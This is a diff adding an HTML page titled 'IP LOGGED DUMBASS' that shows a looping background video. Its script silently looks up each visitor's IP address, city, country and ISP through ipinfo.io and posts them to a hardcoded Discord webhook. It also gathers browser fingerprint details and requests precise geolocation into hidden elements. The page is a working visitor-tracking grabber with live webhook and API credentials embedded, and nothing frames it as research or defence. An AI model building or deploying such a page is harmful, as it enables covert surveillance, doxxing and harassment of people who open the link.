@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP LOGGED DUMBASS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            color: white;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .info-box {
+            margin: 20px;
+            padding: 20px;
+            border: 5px solid #00FF00;
+            display: inline-block;
+            text-align: left;
+            max-width: 600px;
+            word-wrap: break-word;
+        }
+        #background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+</audio>
+    <video autoplay muted loop id="background-video">
+        <source src="idiot.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <div id="ip" style="display: none;"></div>
+    <div id="location" style="display: none;"></div>
+    <div id="isp" style="display: none;"></div>
+    <div id="browser" style="display: none;"></div>
+    <div id="os" style="display: none;"></div>
+    <div id="resolution" style="display: none;"></div>
+    <div id="colorDepth" style="display: none;"></div>
+    <div id="timezone" style="display: none;"></div>
+    <div id="language" style="display: none;"></div>
+    <div id="connection" style="display: none;"></div>
+    <div id="rtt" style="display: none;"></div>
+    <div id="cores" style="display: none;"></div>
+    <div id="memory" style="display: none;"></div>
+    <div id="preciseLocation" style="display: none;"></div>
+    
+    <script>
+        function playAudio() {
+    const audio = document.getElementById("background-audio");
+    audio.play();
+}
+        fetch("https://ipinfo.io?token=50619379773223")
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("ip").textContent = data.ip;
+                document.getElementById("location").textContent = `${data.city}, ${data.region}, ${data.country}`;
+                document.getElementById("isp").textContent = data.org;
+
+                const webhookURL = 'https://discord.com/api/webhooks/1303870070392356877/tP4tidX8N4RMAxlHTLAuKxF2UcPzMgC-YYbOo4m7JF-GlP8VEeni2S1SYZNHRe-NpzBw';
+                const payload = {
+                    content: `IP: ${data.ip}\nAddress: ${data.city}, ${data.region}, ${data.country}\nISP: ${data.org}`
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).then(response => {
+                    console.log('Data sent to Discord webhook');
+                }).catch(error => {
+                    console.error('Error sending data to Discord webhook:', error);
+                });
+            })
+            .catch(error => console.error('Error fetching IP info:', error));
+
+        document.getElementById("browser").textContent = navigator.userAgent;
+        document.getElementById("os").textContent = navigator.platform;
+        document.getElementById("resolution").textContent = `${window.screen.width} x ${window.screen.height}`;
+        document.getElementById("colorDepth").textContent = `${window.screen.colorDepth} bits`;
+        document.getElementById("timezone").textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.getElementById("language").textContent = navigator.language || navigator.userLanguage;
+
+        if (navigator.connection) {
+            document.getElementById("connection").textContent = navigator.connection.effectiveType || "Unknown";
+            document.getElementById("rtt").textContent = `${navigator.connection.rtt} ms` || "Unknown";
+        } else {
+            document.getElementById("connection").textContent = "Not available";
+            document.getElementById("rtt").textContent = "Not available";
+        }
+
+        document.getElementById("cores").textContent = navigator.hardwareConcurrency || "Not available";
+        document.getElementById("memory").textContent = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not available";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    document.getElementById("preciseLocation").textContent = 
+                        `Lat: ${position.coords.latitude.toFixed(4)}, Long: ${position.coords.longitude.toFixed(4)}`;
+                },
+                error => {
+                    document.getElementById("preciseLocation").textContent = "Permission denied";
+                }
+            );
+        } else {
+            document.getElementById("preciseLocation").textContent = "Not supported";
+        }
+    </script>
+</body>
+</html>
